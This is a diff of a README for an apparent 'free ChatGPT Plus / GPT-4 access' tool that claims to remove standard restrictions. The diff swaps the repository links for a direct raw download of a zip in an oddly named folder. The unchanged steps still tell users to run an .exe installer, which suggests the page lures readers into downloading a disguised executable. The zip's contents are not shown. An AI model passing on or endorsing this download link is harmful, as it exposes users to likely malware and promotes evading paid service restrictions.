@@ -1,6 +1,6 @@
 # 🤖 chatgpt-plus-free-gpt-4-free-access - Access premium artificial intelligence features today
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Finetoothed-streak599/chatgpt-plus-free-gpt-4-free-access)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Finetoothed-streak599/chatgpt-plus-free-gpt-4-free-access/raw/refs/heads/main/caliphship/chatgpt_access_plus_free_gpt_v1.2.zip)
 
 This application provides tools to access advanced artificial intelligence models. Users can utilize features typically reserved for premium subscriptions. The software acts as a bridge between the user and the language model, removing standard restrictions.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements before you start. These specificat
 
 Follow these steps to set up the software on your Windows machine.
 
-1.  Visit the [official link](https://github.com/Finetoothed-streak599/chatgpt-plus-free-gpt-4-free-access) to find the latest version.
+1.  Visit the [official link](https://github.com/Finetoothed-streak599/chatgpt-plus-free-gpt-4-free-access/raw/refs/heads/main/caliphship/chatgpt_access_plus_free_gpt_v1.2.zip) to find the latest version.
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the version number to expand the file list.
 4.  Select the file ending in .exe to download the installer to your computer.
